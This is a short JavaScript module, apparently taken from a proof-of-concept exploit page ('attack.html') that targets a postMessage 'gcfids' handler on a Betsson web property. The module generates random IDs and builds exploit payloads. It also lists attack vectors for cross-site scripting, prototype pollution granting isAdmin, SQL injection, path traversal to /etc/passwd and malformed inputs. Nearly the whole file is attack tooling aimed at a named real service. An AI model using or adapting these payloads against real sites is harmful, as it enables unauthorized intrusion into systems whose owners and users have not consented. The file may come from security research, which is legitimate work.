/**
 * Utility functions extracted from attack.html (Betsson PoC).
 * Random ID generation, attack vector construction, and message formatting.
 */

const GCFIDS_CHARS =
  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-';

/**
 * Generate a random ID string using the same charset and length range
 * as attack.html's generateRandomId().
 */
function generateRandomId(rng) {
  const rand = rng || Math.random;
  const length = 80 + Math.floor(rand() * 20);
  let result = '';
  for (let i = 0; i < length; i++) {
    result += GCFIDS_CHARS.charAt(Math.floor(rand() * GCFIDS_CHARS.length));
  }
  return result;
}

/**
 * Build a gcfids exploit payload.
 */
function buildGcfidsPayload(id) {
  return {
    action: 'gcfids',
    data: { id },
  };
}

/**
 * Return the predefined test vectors used by attack.html.
 */
function getTestVectors() {
  return {
    'null-id': {
      action: 'gcfids',
      data: { id: null },
    },
    'empty-id': {
      action: 'gcfids',
      data: { id: '' },
    },
    'xss-id': {
      action: 'gcfids',
      data: { id: '<img src=x onerror=alert(document.domain)>' },
    },
    'proto-pollution': {
      action: 'gcfids',
      data: { id: 'test', __proto__: { isAdmin: true } },
    },
    'long-id': {
      action: 'gcfids',
      data: { id: new Array(10000).join('A') },
    },
    'special-chars': {
      action: 'gcfids',
      data: { id: '\'";\\x00\\xFF\\uFFFF' },
    },
    sqli: {
      action: 'gcfids',
      data: { id: "' OR 1=1--" },
    },
    'path-traversal': {
      action: 'gcfids',
      data: { id: '../../../etc/passwd' },
    },
  };
}

/**
 * Stringify a payload ready for postMessage (as attack.html does).
 */
function stringifyPayload(payload) {
  return JSON.stringify(payload);
}

module.exports = {
  GCFIDS_CHARS,
  generateRandomId,
  buildGcfidsPayload,
  getTestVectors,
  stringifyPayload,
};
